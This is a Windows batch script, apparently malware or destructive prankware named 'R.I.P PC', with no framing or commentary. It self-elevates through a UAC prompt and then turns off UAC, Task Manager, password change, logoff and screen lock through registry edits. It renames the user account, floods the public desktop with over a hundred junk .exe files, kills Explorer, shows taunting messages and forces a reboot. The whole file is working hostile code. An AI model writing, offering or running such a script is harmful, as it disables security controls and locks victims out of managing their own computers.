@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
color 47
cls
title R.I.P PC...
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg delete "HKCU\Control Panel\Desktop" /V Wallpaper /f
net user %username% /fullname:"die!"
net user guest *die!
cls
@echo off
title R.I.P PC...
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
echo die! > %systemdrive%\users\public\desktop\die!%random%.exe
taskkill /f /im explorer.exe
cls
@echo off
title R.I.P PC...
echo hahahahaha, your system has been switched to the house! start crying ! your system will restart in a few seconds!
echo x=msgbox("Your system is now dead! Say goodbye to your Windows.",0+48,"RIP PC") > %systemdrive%\users\public\Pictures\4324.vbs
start %systemdrive%\users\public\Pictures\4324.vbs
timeout 3 /nobreak >nul
DEL /F /Q /A %systemdrive%\users\public\Pictures\4324.vbs
cls
shutdown /r /t 7 /c "goodbye to your operating system!"
exit